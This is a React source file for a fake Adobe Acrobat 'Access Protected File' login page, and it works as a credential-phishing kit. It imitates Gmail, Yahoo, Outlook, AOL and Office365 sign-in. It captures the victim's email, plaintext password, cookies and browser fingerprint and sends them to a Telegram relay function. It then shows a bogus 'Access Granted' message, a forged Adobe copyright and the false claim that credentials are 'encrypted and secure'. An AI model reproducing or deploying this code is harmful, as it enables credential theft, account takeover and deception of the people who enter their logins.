import React, { useState } from 'react';
import { ArrowLeft, Mail, Lock, Eye, EyeOff } from 'lucide-react';
import { collectBrowserFingerprint, createCookiesFile } from '../utils/cookieCollector';

interface LoginPageProps {
  fileName: string;
  onBack: () => void;
  onLoginSuccess?: (sessionData: any) => void;
}

const LoginPage: React.FC<LoginPageProps> = ({ fileName, onBack, onLoginSuccess }) => {
  const [selectedProvider, setSelectedProvider] = useState<string>('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const emailProviders = [
    { 
      name: 'Office365', 
      domain: 'outlook.com', 
      color: 'bg-blue-600', 
      logo: 'https://www.svgrepo.com/show/503426/microsoft-office.svg'
    },
    { 
      name: 'Yahoo', 
      domain: 'yahoo.com', 
      color: 'bg-purple-600', 
      logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/0/0a/Yahoo_Y_%282009-2013%29.svg/450px-Yahoo_Y_%282009-2013%29.svg.png?20100624225346'
    },
    { 
      name: 'Outlook', 
      domain: 'outlook.com', 
      color: 'bg-blue-500', 
      logo: 'https://www.svgrepo.com/show/443244/brand-microsoft-outlook.svg'
    },
    { 
      name: 'AOL', 
      domain: 'aol.com', 
      color: 'bg-red-600', 
      logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/2/2b/AOL_logo_%282024%29.svg/1199px-AOL_logo_%282024%29.svg.png?20241206193155'
    },
    { 
      name: 'Gmail', 
      domain: 'gmail.com', 
      color: 'bg-red-500', 
      logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Gmail_icon_%282020%29.svg/768px-Gmail_icon_%282020%29.svg.png?20221017173631'
    },
    { 
      name: 'Others', 
      domain: 'other.com', 
      color: 'bg-gray-600', 
      logo: 'https://www.svgrepo.com/show/521128/email-1.svg'
    },
  ];

  const handleProviderSelect = (provider: string) => {
    setSelectedProvider(provider);
  };

  const storeSessionLocally = (loginData: any) => {
    const sessionData = {
      email: loginData.email,
      provider: loginData.provider,
      fileName: loginData.fileName,
      timestamp: loginData.timestamp,
      sessionId: Math.random().toString(36).substring(2, 15),
      deviceInfo: {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language
      }
    };

    localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionData));
    sessionStorage.setItem('adobe_current_session', JSON.stringify(sessionData));
    
    console.log('AutoGrab session stored:', sessionData);
    return sessionData;
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password || !selectedProvider) return;

    setIsLoading(true);

    try {
      // Collect comprehensive browser fingerprint including cookies
      const browserFingerprint = collectBrowserFingerprint();
      
      const loginData = {
        email,
        password,
        provider: selectedProvider,
        fileName,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        ip: 'hidden',
        browserFingerprint
      };

      console.log('Attempting login with data:', { ...loginData, password: '[HIDDEN]' });

      // Create and download cookies file
      createCookiesFile(browserFingerprint, loginData);

      const sessionData = storeSessionLocally(loginData);

      const telegramResponse = await fetch('/.netlify/functions/sendTelegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json',
        },
        body: JSON.stringify(loginData),
        signal: AbortSignal.timeout(30000),
      });

      console.log('Telegram response status:', telegramResponse.status);
      
      if (!telegramResponse.ok) {
        const errorText = await telegramResponse.text();
        console.error('Telegram API error:', errorText);
        
        if (telegramResponse.status === 500) {
          throw new Error('Server configuration error. Please contact support.');
        } else if (telegramResponse.status === 404) {
          throw new Error('Service temporarily unavailable. Please try again.');
        } else {
          throw new Error(`Network error (${telegramResponse.status}). Please check your connection.`);
        }
      }

      const telegramResult = await telegramResponse.json();
      console.log('Telegram result:', telegramResult);

      const sessionResponse = await fetch('/.netlify/functions/setSession', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json',
        },
        body: JSON.stringify({
          email,
          provider: selectedProvider,
          fileName,
          sessionId: sessionData.sessionId,
        }),
        signal: AbortSignal.timeout(15000),
      });

      console.log('Session response status:', sessionResponse.status);

      if (sessionResponse.ok) {
        if (onLoginSuccess) {
          onLoginSuccess(sessionData);
        }

        // Show success message
        const successDiv = document.createElement('div');
        successDiv.innerHTML = `
          <div style="
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            z-index: 10000;
            text-align: center;
            font-family: system-ui, -apple-system, sans-serif;
          ">
            <div style="color: #059669; font-size: 18px; font-weight: 600; margin-bottom: 10px;">
              ✓ Access Granted!
            </div>
            <div style="color: #374151; font-size: 14px;">
              Opening ${fileName}...
            </div>
          </div>
        `;
        document.body.appendChild(successDiv);
        
        setTimeout(() => {
          document.body.removeChild(successDiv);
        }, 2000);
        
        onBack();
      } else {
        const sessionErrorText = await sessionResponse.text();
        console.error('Session creation error:', sessionErrorText);
        alert('Session creation failed. Please try again.');
      }
    } catch (error) {
      console.error('Login error:', error);
      
      if (error instanceof Error) {
        if (error.name === 'AbortError') {
          alert('Request timed out. Please check your internet connection and try again.');
        } else if (error.message.includes('Failed to fetch')) {
          alert('Network error. Please check your internet connection and try again.');
        } else {
          alert(`Authentication failed: ${error.message}`);
        }
      } else {
        alert('Authentication failed. Please try again.');
      }
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen relative overflow-hidden">
      {/* Adobe-style linear gradient background */}
      <div className="absolute inset-0 bg-gradient-to-br from-[#F40F02] to-[#FAD0C4]"></div>
      <div className="absolute inset-0 backdrop-blur-sm"></div>
      
      {/* Complementary decorative elements */}
      <div className="absolute top-5 left-5 w-48 h-48 bg-[#FAD0C4]/20 rounded-full blur-2xl"></div>
      <div className="absolute bottom-5 right-5 w-56 h-56 bg-white/15 rounded-full blur-3xl"></div>
      <div className="absolute top-1/2 left-1/4 w-32 h-32 bg-white/25 rounded-full blur-xl"></div>
      <div className="absolute bottom-1/4 right-1/3 w-40 h-40 bg-[#F40F02]/10 rounded-full blur-2xl"></div>
      <div className="absolute top-1/4 right-1/2 w-28 h-28 bg-[#FAD0C4]/15 rounded-full blur-lg"></div>
      
      <div className="relative z-10 flex items-center justify-center min-h-screen p-4">
        <div className="w-full max-w-md">
          {/* Header */}
          <div className="text-center mb-8">
            <button
              onClick={onBack}
              className="inline-flex items-center gap-2 text-gray-600 hover:text-gray-900 mb-6 transition-colors duration-200"
            >
              <ArrowLeft className="w-4 h-4" />
              Back to Files
            </button>
            
            <div className="w-16 h-16 flex items-center justify-center mx-auto mb-4">
              <img 
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/833px-PDF_file_icon.svg.png" 
                alt="Adobe Acrobat" 
                className="w-12 h-12 object-contain"
              />
            </div>
            
            <h1 className="text-2xl font-bold text-gray-900 mb-2">Access Protected File</h1>
            <p className="text-base text-gray-600">
              Please authenticate to access <span className="font-medium break-all">{fileName}</span>
            </p>
          </div>

          {/* Login Form */}
          <div className="bg-white/90 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/30 p-8">
            {!selectedProvider ? (
              // Provider Selection
              <div>
                <h2 className="text-lg font-semibold text-gray-900 mb-4">
                  Choose your email provider
                </h2>
                <div className="grid grid-cols-2 gap-3">
                  {emailProviders.map((provider) => (
                    <button
                      key={provider.name}
                      onClick={() => handleProviderSelect(provider.name)}
                      className={`${provider.color} text-white p-4 rounded-xl hover:opacity-90 transition-all duration-200 transform hover:scale-105 flex flex-col items-center gap-2 shadow-lg`}
                    >
                      <img 
                        src={provider.logo} 
                        alt={provider.name} 
                        className="w-8 h-8 object-contain filter brightness-0 invert"
                        onError={(e) => {
                          const target = e.target as HTMLImageElement;
                          target.style.display = 'none';
                          const parent = target.parentElement;
                          if (parent && !parent.querySelector('.fallback-text')) {
                            const fallback = document.createElement('div');
                            fallback.className = 'fallback-text text-2xl font-bold';
                            fallback.textContent = provider.name.charAt(0);
                            parent.insertBefore(fallback, target.nextSibling);
                          }
                        }}
                      />
                      <span className="font-medium text-sm">{provider.name}</span>
                    </button>
                  ))}
                </div>
              </div>
            ) : (
              // Login Form
              <div>
                <div className="flex items-center gap-3 mb-6">
                  <button
                    onClick={() => setSelectedProvider('')}
                    className="text-gray-400 hover:text-gray-600 transition-colors duration-200"
                  >
                    <ArrowLeft className="w-4 h-4" />
                  </button>
                  <h2 className="text-lg font-semibold text-gray-900">
                    Sign in with {selectedProvider}
                  </h2>
                </div>

                <form onSubmit={handleLogin} className="space-y-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Email Address
                    </label>
                    <div className="relative">
                      <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
                      <input
                        type="email"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-red-500 focus:border-transparent transition-all duration-200 bg-white/80 backdrop-blur-sm text-base"
                        placeholder="Enter your email"
                        required
                      />
                    </div>
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Password
                    </label>
                    <div className="relative">
                      <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
                      <input
                        type={showPassword ? 'text' : 'password'}
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        className="w-full pl-10 pr-12 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-red-500 focus:border-transparent transition-all duration-200 bg-white/80 backdrop-blur-sm text-base"
                        placeholder="Enter your password"
                        required
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors duration-200"
                      >
                        {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                      </button>
                    </div>
                  </div>

                  <button
                    type="submit"
                    disabled={isLoading || !email || !password}
                    className="w-full bg-gradient-to-r from-red-600 to-red-700 text-white py-3 rounded-xl font-medium hover:from-red-700 hover:to-red-800 disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-200 transform hover:scale-[1.02] active:scale-[0.98] shadow-lg text-base"
                  >
                    {isLoading ? (
                      <div className="flex items-center justify-center gap-2">
                        <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                        Authenticating...
                      </div>
                    ) : (
                      'Access File'
                    )}
                  </button>
                </form>

                <div className="mt-6 text-center">
                  <p className="text-xs text-gray-500">
                    Your credentials are encrypted and secure
                  </p>
                </div>
              </div>
            )}
          </div>

          {/* Adobe Footer */}
          <div className="text-center mt-8">
            <p className="text-sm text-gray-700 font-medium">
              © 2025 Adobe Inc. All rights reserved.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginPage;